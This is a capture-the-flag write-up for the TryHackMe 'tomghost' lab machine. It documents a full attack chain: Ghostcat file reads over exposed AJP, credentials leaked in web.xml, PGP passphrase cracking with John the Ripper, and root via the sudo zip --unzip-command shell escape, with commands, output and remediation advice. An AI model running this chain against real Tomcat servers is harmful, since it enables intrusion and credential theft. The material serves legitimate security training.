
# tomghost

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

Room: https://tryhackme.com/room/tomghost

boot2root machine for FIT and bsides guatemala CTF

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/tomghost.md

---

## Overview

This room centres around an exposed Apache Tomcat instance with the AJP connector enabled. The interesting services are Tomcat on port `8080` and AJP on port `8009`. The AJP service allows us to read files from the Tomcat web application using Ghostcat, which leads to credentials, SSH access, PGP-protected credentials, and finally a `sudo` misconfiguration involving `zip`.

In this write-up:

- IP addresses have been replaced with `TARGET` and `ATTACKBOX`
- Flags have been partially redacted
- Passwords have been partially redacted
- Original command input and output has been kept where possible

---

## Enumeration

We start with an Nmap scan to identify exposed services. Nmap is useful here because it gives us open ports, service names, and version information. The version information is especially important because Tomcat `9.0.30` plus exposed AJP is a strong hint towards Ghostcat.

```bash
nmap -p- -sS -T4 -sV -O TARGET
```

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-28 10:23 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for TARGET
Host is up (0.00070s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/28%OT=22%CT=1%CU=33035%PV=Y%DS=1%DC=I%G=Y%TM=69F07CC
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M23
OS:01ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68
OS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.05 seconds
```

The key findings are:

```text
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
```

Apache JServ Protocol, usually shortened to AJP, is a binary protocol commonly used between a front-end web server and Tomcat. When AJP is exposed directly, it can be dangerous. Tomcat `9.0.30` is especially interesting because it is associated with Ghostcat, also known as CVE-2020-1938.

---

## Checking Tomcat Manager

Browsing to the Tomcat Manager gave a `403 Access Denied` message.

```text
403 Access Denied

You are not authorized to view this page.

By default the Manager is only accessible from a browser running on the same machine as Tomcat.
```

This tells us the Manager application exists, but it is restricted to localhost by default. We could try credentials or header tricks, but the exposed AJP service is the stronger lead.

---

## Testing Ghostcat with ajpShooter

The room image of Ghostcat and exposed AJP service point towards Ghostcat. We use `ajpShooter.py`, a proof-of-concept tool that can interact with Tomcat over AJP.

Tool used:

```text
https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/refs/heads/master/ajpShooter.py
```

We first try some common Manager and Host Manager endpoints.

```bash
python3 ajpShooter.py http://TARGET:8080 8009 /manager/html read
python3 ajpShooter.py http://TARGET:8080 8009 /manager/text/list read
python3 ajpShooter.py http://TARGET:8080 8009 /host-manager/html read
```

We also try the Manager web application deployment descriptors.

```bash
python3 ajpShooter.py http://TARGET:8080 8009 /manager/WEB-INF/web.xml read
python3 ajpShooter.py http://TARGET:8080 8009 /host-manager/WEB-INF/web.xml read
```

These returned errors, but that still confirmed we were reaching Tomcat through AJP. The next common file to read is the main web app deployment descriptor:

```bash
python3 ajpShooter.py http://TARGET:8080 8009 /WEB-INF/web.xml read
```

This succeeds.

```text
</pre><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/9.0.30</h3></body></html>root@ATTACKBOX:~# python3 ajpShooter.py http://TARGET:8080 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlks********
  </description>

</web-app>
```

The `description` field leaks credentials. Redacted for publishing:

```text
skyfuck:8730281lkjlkjdqlks********
```

---

## SSH as skyfuck

Using the leaked credentials, we SSH into the target.

```bash
ssh skyfuck@TARGET
```

```text
pingu@nootnoot:~/projects/ctf-c2$ ssh skyfuck@TARGET
skyfuck@TARGET's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
skyfuck@ubuntu:~$ whoami
skyfuck
skyfuck@ubuntu:~$ ls /home
merlin  skyfuck
skyfuck@ubuntu:~$ pwd
/home/skyfuck
skyfuck@ubuntu:~$ cd ../merlin/
skyfuck@ubuntu:/home/merlin$ ls
user.txt
skyfuck@ubuntu:/home/merlin$ cat user.txt 
THM{GhostCat_1s_********}
skyfuck@ubuntu:/home/merlin$ 
```

The user flag was readable from Merlin's home directory.

Redacted user flag:

```text
THM{GhostCat_1s_********}
```

In `/home/skyfuck`, we also found:

```text
credential.pgp
tryhackme.asc
```

The `.asc` file looks like an exported PGP key, while the `.pgp` file is likely encrypted data.

---

## Downloading the PGP Files

We copy the files back to the AttackBox for easier cracking.

```bash
scp skyfuck@TARGET:/home/skyfuck/{credential.pgp,tryhackme.asc} .
```

`scp` is used here because we already have SSH credentials. It lets us securely copy files from the target back to our local machine.

---

## Cracking the PGP Key Passphrase

The private key is protected with a passphrase. To crack it, we first convert it into a John-compatible hash.

Depending on the system, `gpg2john` may need its full path:

```bash
/usr/share/john/gpg2john.py tryhackme.asc > pgp.hash
```

In the notes, it was run as:

```bash
gpg2john tryhackme.asc > pgp.hash
```

```text
root@ATTACKBOX:~# gpg2john tryhackme.asc > pgp.hash

File tryhackme.asc
```

Now crack the hash with John the Ripper and `rockyou.txt`.

```bash
john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
root@ATTACKBOX:~# john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
Use the "--format=gpg-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexxxxx        (tryhackme)
1g 0:00:00:00 DONE (2026-04-28 11:16) 6.250g/s 6700p/s 6700c/s 6700C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The recovered PGP passphrase is redacted as:

```text
alex****
```

---

## Decrypting the Credential File

Now import the PGP key.

```bash
gpg --import tryhackme.asc
```

```text
root@ATTACKBOX:~# gpg --import tryhackme.asc
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

Then decrypt the encrypted credential file.

```bash
gpg -d credential.pgp
```

```text
root@ATTACKBOX:~# gpg -d credential.pgp
gpg: WARNING: cypher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12kj********@ATTACKBOX:~# 
```

This reveals credentials for another local user.

Redacted:

```text
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12kj********
```

---

## SSH as merlin

Use the decrypted credentials to log in as `merlin`.

```bash
ssh merlin@TARGET
```

Once logged in, check basic user context and sudo permissions.

```bash
whoami
id
sudo -l
```

---

## Privilege Escalation with sudo zip

Running `sudo -l` shows that Merlin can run `/usr/bin/zip` as root without a password.

```bash
sudo -l
```

```text
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

This is exploitable because `zip` can run a custom command during archive testing via the `-T` and `--unzip-command` options. This is a known GTFOBins technique.

Run:

```bash
sudo /usr/bin/zip /tmp/test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"
```

```text
merlin@ubuntu:/home/skyfuck$ sudo /usr/bin/zip /tmp/test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"
  adding: etc/hosts (deflated 31%)
# whoami
root
# cd /root
# ls
root.txt  ufw
# cat root.txt
THM{Z1P_1*_****}}
```

We now have a root shell and can read the root flag.

Redacted root flag:

```text
THM{Z1P_1*_****}
```

---

## Attack Chain Summary

1. Nmap identified Tomcat `9.0.30` on `8080` and AJP on `8009`.
2. Tomcat Manager existed but returned `403 Access Denied`.
3. AJP was exposed, making Ghostcat a likely attack path.
4. `ajpShooter.py` was used to read `/WEB-INF/web.xml`.
5. The web app descriptor leaked SSH credentials for `skyfuck`.
6. SSH access revealed `credential.pgp` and `tryhackme.asc`.
7. `gpg2john` converted the PGP key into a crackable hash.
8. John cracked the PGP key passphrase.
9. GPG decrypted the credential file and revealed `merlin` credentials.
10. `sudo -l` showed Merlin could run `/usr/bin/zip` as root without a password.
11. `zip` was abused via GTFOBins to spawn a root shell.
12. Root flag was captured.

---

## Remediation Notes

For real systems, this chain highlights several issues:

- Do not expose AJP directly to untrusted networks.
- Upgrade Tomcat versions affected by Ghostcat.
- Bind AJP to localhost or disable it if unused.
- Never place credentials in `web.xml` comments, descriptions, or config files.
- Avoid reusing weak passphrases for private keys.
- Audit `sudo` permissions carefully.
- Avoid granting root-level access to binaries with shell escape behaviour, such as `zip`.
